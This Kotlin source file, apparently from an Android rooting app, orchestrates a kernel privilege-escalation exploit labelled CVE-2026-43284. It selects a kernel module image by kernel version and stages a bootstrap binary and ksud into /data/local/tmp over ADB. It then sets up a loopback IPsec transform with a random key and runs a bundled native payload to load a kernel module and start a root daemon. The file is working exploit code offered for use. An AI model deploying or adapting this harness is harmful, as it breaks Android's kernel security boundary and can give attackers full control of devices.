package com.hexo141.liquidglass.root

import android.content.Context
import android.net.IpSecAlgorithm
import android.net.IpSecManager
import android.net.IpSecTransform
import android.os.Build
import android.util.Log
import com.hexo141.liquidglass.adb.AbsAdbConnectionManager
import com.hexo141.liquidglass.adb.AdbShell
import java.io.File
import java.net.DatagramSocket
import java.net.InetAddress
import java.security.SecureRandom

/**
 * Second engine: a page cache write primitive (CVE-2026-43284) that loads a small kernel module
 * and is independent of the per-device kernel profiles.
 *
 * Unlike the profile payload this one has to run inside the app process: the exploit needs the
 * IPsec transform the app installs on loopback, and it receives the encapsulation port, SPI and
 * AES key from us. Everything it needs on the device side (`bootstrap`, `ksud`, its preferences)
 * is staged into `/data/local/tmp/openroot` through the ADB connection, because the kernel module
 * execs `bootstrap` from a fixed path.
 */
object DirtyFragRunner {
    private const val TAG = "DirtyFragRunner"
    private const val STAGE_DIR = "/data/local/tmp/openroot"
    private const val PAYLOAD = "libopenroot.so"
    private const val BOOTSTRAP = "libopenbootstrap.so"

    /** Name the kernel module execs; the path is baked into the module image. */
    private const val BOOTSTRAP_REMOTE = "loader"

    /** Kernel module images the payload carries, as `android<release>-<major>.<minor>`. */
    private data class Kmi(val android: Int, val major: Int, val minor: Int) {
        override fun toString() = "android$android-$major.$minor"
    }

    private val KMI_TABLE = listOf(
        Kmi(12, 5, 10),
        Kmi(13, 5, 10),
        Kmi(13, 5, 15),
        Kmi(14, 5, 15),
        Kmi(14, 6, 1),
        Kmi(15, 6, 6),
        Kmi(16, 6, 12),
        Kmi(17, 6, 18),
    )

    /** Thrown when no bundled module image matches the kernel. */
    class UnsupportedKernelException(release: String) :
        Exception("No module image for kernel \"$release\"")

    /**
     * Picks the module image exactly like the payload does: the same kernel major/minor is
     * required, an exact Android release is preferred and any other release with the same kernel
     * version is used as a fallback.
     */
    private fun selectKmi(androidRelease: String, kernelRelease: String): Kmi? {
        val version = Regex("""^(\d+)\.(\d+)""").find(kernelRelease.trim()) ?: return null
        val major = version.groupValues[1].toIntOrNull() ?: return null
        val minor = version.groupValues[2].toIntOrNull() ?: return null
        val android = Regex("""android(\d+)""").find(kernelRelease)?.groupValues?.get(1)?.toIntOrNull()
            ?: Regex("""(\d+)""").find(androidRelease)?.groupValues?.get(1)?.toIntOrNull()
            ?: return null

        var fallback: Kmi? = null
        for (kmi in KMI_TABLE) {
            if (kmi.major != major || kmi.minor != minor) continue
            if (kmi.android == android) return kmi
            if (fallback == null) fallback = kmi
        }
        return fallback
    }

    /** Whether this ABI actually got the payload and its bootstrap. */
    fun isPayloadPresent(context: Context): Boolean {
        val dir = context.applicationInfo.nativeLibraryDir
        return File(dir, PAYLOAD).isFile && File(dir, BOOTSTRAP).isFile
    }

    /** Human readable engine name for the status card, e.g. `CVE-2026-43284 (android15-6.6)`. */
    fun describe(androidRelease: String, kernelRelease: String): String? =
        selectKmi(androidRelease, kernelRelease)?.let { "CVE-2026-43284 ($it)" }

    fun isSupported(androidRelease: String, kernelRelease: String): Boolean =
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.S_V2 &&
            selectKmi(androidRelease, kernelRelease) != null

    /** What to do once the kernel module is up. */
    enum class Mode {
        /** Start the manager's SU daemon (`ksud`). */
        KERNEL_SU,

        /** No manager: keep a root command channel instead. */
        ROOT_COMMAND,
    }

    /** Outcome of one run. */
    data class Result(val exitCode: Int, val handoff: RootHandoff.Result)

    /**
     * Stages the helper files over ADB and runs the payload from the app process.
     *
     * @param suManager manager whose `libksud.so` is staged as `ksud`; the module cannot start
     *        root without it
     */
    @Throws(Exception::class)
    fun run(
        context: Context,
        manager: AbsAdbConnectionManager,
        androidRelease: String,
        kernelRelease: String,
        suManager: KsuManager.Target?,
        mode: Mode = Mode.KERNEL_SU,
        onLine: (String) -> Unit,
        onProgress: (Float) -> Unit = {},
    ): Result {
        val kmi = selectKmi(androidRelease, kernelRelease) ?: throw UnsupportedKernelException(kernelRelease)
        onProgress(0.08f)
        onLine("$ uname -r   # $kmi")

        if (mode == Mode.KERNEL_SU && suManager == null) {
            onLine("<e> no libksud.so; install a manager or pick the root command mode")
            throw IllegalStateException("No root manager with libksud.so")
        }
        onLine(
            when (mode) {
                Mode.KERNEL_SU -> "$ ksud late-load --package-name ${suManager?.packageName}"
                Mode.ROOT_COMMAND -> "$ bootstrap --no-manager"
            }
        )

        stage(context, manager, suManager, mode, onLine, onProgress)
        onProgress(0.45f)

        val payload = File(context.applicationInfo.nativeLibraryDir, PAYLOAD)
        require(payload.isFile) { "Payload is not packaged for this ABI (${payload.absolutePath})" }

        val ipsec = context.getSystemService(Context.IPSEC_SERVICE) as? IpSecManager
            ?: throw IllegalStateException("IpSecManager unavailable")
        val encap = ipsec.openUdpEncapsulationSocket()
        val loopback = InetAddress.getByName("127.0.0.1")
        val spi = ipsec.allocateSecurityParameterIndex(loopback)
        val aesKey = ByteArray(32).also { SecureRandom().nextBytes(it) }
        val senderPort = DatagramSocket(0, loopback).use { it.localPort }
        val transform = IpSecTransform.Builder(context)
            .setEncryption(IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey))
            .setIpv4Encapsulation(encap, senderPort)
            .buildTransportModeTransform(loopback, spi)

        try {
            onProgress(0.55f)
            onLine("$ ./$PAYLOAD --encap-port ${encap.port} --spi ${Integer.toUnsignedString(spi.spi)}")
            val process = ProcessBuilder(
                payload.absolutePath,
                "--encap-port", encap.port.toString(),
                "--sender-port", senderPort.toString(),
                "--spi", Integer.toUnsignedString(spi.spi),
                "--aes-key", aesKey.joinToString("") { "%02x".format(it) },
            ).redirectErrorStream(true).start()

            process.inputStream.bufferedReader().useLines { lines ->
                lines.forEach { line ->
                    onLine(line)
                }
            }
            onProgress(0.9f)
            val exitCode = process.waitFor()
            // The kernel module execs `bootstrap`, so the outcome is whatever it started, not the
            // stage marker the payload itself left behind. It runs asynchronously, so poll.
            val handoff = RootHandoff.probe(manager, onLine, waitMs = 30_000)

            onProgress(1f)
            return Result(exitCode, handoff)
        } finally {
            runCatching { transform.close() }
            runCatching { spi.close() }
            runCatching { encap.close() }
        }
    }

    /**
     * Pushes everything the kernel module expects at [STAGE_DIR]: the bootstrap it execs, the
     * manager's `ksud`, and the preference file bootstrap reads before starting the daemon.
     */
    private fun stage(
        context: Context,
        manager: AbsAdbConnectionManager,
        suManager: KsuManager.Target?,
        mode: Mode,
        onLine: (String) -> Unit,
        onProgress: (Float) -> Unit,
    ) {
        val bootstrap = File(context.applicationInfo.nativeLibraryDir, BOOTSTRAP)
        require(bootstrap.isFile) { "bootstrap is not packaged for this ABI" }

        onLine("$ mkdir -p $STAGE_DIR")
        AdbShell.exec(manager, "mkdir -p $STAGE_DIR")
        onLine("$ cat > $STAGE_DIR/$BOOTSTRAP_REMOTE")
        AdbShell.push(manager, "$STAGE_DIR/$BOOTSTRAP_REMOTE", bootstrap.readBytes())
        onProgress(0.2f)
        onLine("$ chmod 755 $STAGE_DIR/$BOOTSTRAP_REMOTE")
        AdbShell.exec(manager, "chmod 755 $STAGE_DIR/$BOOTSTRAP_REMOTE")

        // The daemon reads its settings from here; values match the app's own toggles.
        val managerValue = if (mode == Mode.KERNEL_SU) suManager?.packageName.orEmpty() else "none"
        val prefs = """
            <?xml version='1.0' encoding='utf-8' standalone='yes' ?>
            <map>
                <string name="su_manager">$managerValue</string>
                <boolean name="soft_reboot" value="false" />
                <boolean name="disable_modules" value="false" />
            </map>
        """.trimIndent().toByteArray()
        onLine("$ cat > $STAGE_DIR/openroot.xml")
        AdbShell.push(manager, "$STAGE_DIR/openroot.xml", prefs)
        onProgress(0.3f)
        AdbShell.exec(manager, "chmod 644 $STAGE_DIR/openroot.xml")

        // libksud.so lives in the manager's native library dir. Push the bytes rather than running
        // `cp` on the device: some ROMs have no usable `cp` for the shell user, and the confirmation
        // can be dropped by the pipe even when the copy works.
        if (mode == Mode.KERNEL_SU && suManager != null) {
            val alreadyStaged = AdbShell.exec(
                manager,
                "test -s $STAGE_DIR/ksud && test -x $STAGE_DIR/ksud && echo ok",
            ).contains("ok")
            if (alreadyStaged) {
                onLine("$ test -x $STAGE_DIR/ksud    # already staged, skipping")
                onProgress(0.38f)
            } else {
                val ksudBytes = KsuManager.readKsud(suManager.ksudPath)
                if (ksudBytes == null) {
                    onLine("<e> cannot read ${suManager.ksudPath} from this app")
                } else {
                    onLine("$ cat > $STAGE_DIR/ksud    # ${ksudBytes.size} bytes")
                    AdbShell.push(manager, "$STAGE_DIR/ksud", ksudBytes)
                    onLine("$ chmod 755 $STAGE_DIR/ksud")
                    AdbShell.exec(manager, "chmod 755 $STAGE_DIR/ksud")
                    onProgress(0.38f)
                    val staged = AdbShell.exec(
                        manager,
                        "test -x $STAGE_DIR/ksud && echo ok",
                    ).contains("ok")
                    if (!staged) {
                        Log.w(TAG, "staging ksud failed at $STAGE_DIR/ksud")
                    }
                }
            }
        }
    }
}
